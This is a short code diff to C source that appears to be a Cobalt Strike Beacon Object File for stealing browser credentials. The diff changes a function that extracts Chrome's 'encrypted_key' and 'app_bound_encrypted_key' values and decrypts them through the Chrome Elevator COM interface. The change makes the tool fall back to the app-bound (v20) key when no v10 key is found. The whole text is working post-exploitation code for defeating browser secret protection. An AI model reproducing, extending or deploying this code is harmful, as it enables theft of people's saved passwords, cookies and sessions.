@@ -410,19 +410,18 @@ VOID GetEncryptionKey(char * browser) {
 
     CHAR pattern[] = "\"encrypted_key\":\"";
     key = ExtractKey(app_data, pattern);
-    if(key == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] There's no v10 encryption key");
-        return;
-    }
-    //BeaconPrintf(CALLBACK_OUTPUT, "Got Encrypted Key ");
-    GetMasterKey(key);
-
     CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
     app_key = ExtractKey(app_data, app_pattern);
+    if(key != NULL) {
+        GetMasterKey(key);
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,"[!] There's no v10 encryption key, checking v20...");
+    }
     if(app_key == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"[!] No appbound encryption key available\n");
         return;
     }
+    //BeaconPrintf(CALLBACK_OUTPUT, "Got Encrypted Key ");
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         GetAppBoundKey(app_key, browser, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
     }
